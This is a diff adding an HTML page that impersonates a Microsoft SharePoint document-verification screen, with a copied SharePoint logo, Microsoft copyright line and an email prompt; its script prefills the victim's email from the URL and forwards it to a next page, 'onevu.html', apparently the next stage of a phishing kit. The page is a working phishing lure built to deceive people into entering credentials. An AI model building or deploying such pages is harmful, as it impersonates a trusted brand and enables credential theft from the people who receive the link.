@@ -1,0 +1,126 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>SharePoint Verification</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <!-- Bootstrap & Icons -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css">
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+
+  <style>
+    body {
+      background-color: #e6f2f0;
+      font-family: "Segoe UI", sans-serif;
+    }
+
+    .card {
+      border-radius: 1rem;
+    }
+
+    .logo {
+      width: 60px;
+      margin-bottom: 15px;
+    }
+
+    .header-title {
+      font-size: 1.5rem;
+      font-weight: bold;
+      color: #0078d4;
+    }
+
+    .btn-primary {
+      background-color: #0078d4;
+      border-color: #0078d4;
+    }
+
+    .btn-primary:hover {
+      background-color: #005a9e;
+      border-color: #005a9e;
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container py-5">
+    <div class="row justify-content-center align-items-center">
+      <div class="col-md-8 col-lg-6">
+        <div class="card shadow-sm">
+          <div class="card-body p-5 text-center">
+
+            <!-- SharePoint Logo -->
+            <div class="logo mx-auto">
+              <svg viewBox="0 0 88 88" xmlns="http://www.w3.org/2000/svg">
+                <defs>
+                  <radialGradient id="spGradient" cx="50%" cy="50%" r="50%">
+                    <stop offset="0%" stop-color="#03A78F"/>
+                    <stop offset="100%" stop-color="#007B5A"/>
+                  </radialGradient>
+                </defs>
+                <circle cx="66" cy="24" r="14" fill="#02735E"/>
+                <circle cx="70" cy="64" r="14" fill="#02897A"/>
+                <circle cx="28" cy="44" r="14" fill="url(#spGradient)"/>
+                <path d="M15,27 C15,20 24,15 30,14 L64,16 C70,16 74,20 74,26 L74,60 C74,66 70,70 64,70 L30,70 C24,70 15,65 15,58 Z" fill="#036C70"/>
+                <path d="M38 58c1.5 1.2 3.5 1.8 5.7 1.8 2.4 0 4.2-.4 5.5-1.3 1.3-.9 2-2.3 2-4.1 0-1.2-.3-2.2-.9-3-.6-.8-1.3-1.4-2.2-1.8-.9-.4-2.1-.8-3.6-1.1-1.9-.4-3.2-.8-4.1-1.4s-1.3-1.3-1.3-2.2c0-.9.4-1.6 1.1-2.1.8-.5 1.8-.8 3.1-.8 1.2 0 2.3.2 3.2.6.9.4 1.6.9 2.2 1.6l3.2-3.4c-1.6-1.9-4.1-2.8-7.4-2.8-2.2 0-4.1.4-5.6 1.3s-2.2 2.3-2.2 4.2c0 1.4.4 2.5 1.1 3.4.7.9 1.7 1.6 3 2.1 1.3.5 2.6.9 4.1 1.2 1.3.3 2.2.7 2.9 1.2.6.5 1 1.2 1 2 0 1.1-.4 1.9-1.2 2.4-.8.5-1.9.8-3.2.8-1.4 0-2.7-.3-3.7-1-1.1-.7-1.8-1.6-2.3-2.7l-3.5 3.1z" fill="#ffffff"/>
+              </svg>
+            </div>
+
+            <h3 class="header-title">SharePoint</h3>
+
+            <p class="lead mt-3">
+              Please verify your email address to securely access your document.
+            </p>
+
+            <div class="alert alert-info small text-left" style="border-left: 3px solid #0078d4;">
+              For security reasons, authentication is required before accessing shared documents.
+            </div>
+
+            <!-- Email Input -->
+            <input type="email" id="email" value="" class="form-control mt-3"
+                   placeholder="Enter your email address">
+
+            <div class="text-left small text-danger d-none mt-2" id="errorMsg">
+              ⚠ Please enter a valid email address.
+            </div>
+
+            <button id="submitBtn" class="btn btn-primary btn-block mt-4">
+              Proceed to Document
+            </button>
+
+            <hr>
+            <p class="small">If you need assistance, contact your SharePoint administrator.</p>
+            <p class="small">All rights reserved⋅ &copy; Microsoft 2026</p>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Scripts -->
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+  <script>
+    const emailFromUrl = new URLSearchParams(window.location.search).get('email');
+    if (emailFromUrl) {
+      $('#email').val(emailFromUrl);
+    }
+
+    $('#submitBtn').click(function () {
+      const email = $('#email').val().trim();
+      const errorMsg = $('#errorMsg');
+
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+
+      if (!emailRegex.test(email)) {
+        errorMsg.removeClass('d-none');
+        return;
+      }
+
+      errorMsg.addClass('d-none');
+
+      const redirectUrl = 'onevu.html?email=' +email;
+      window.location.href = redirectUrl;
+    });
+  </script>
+</body>
+</html>
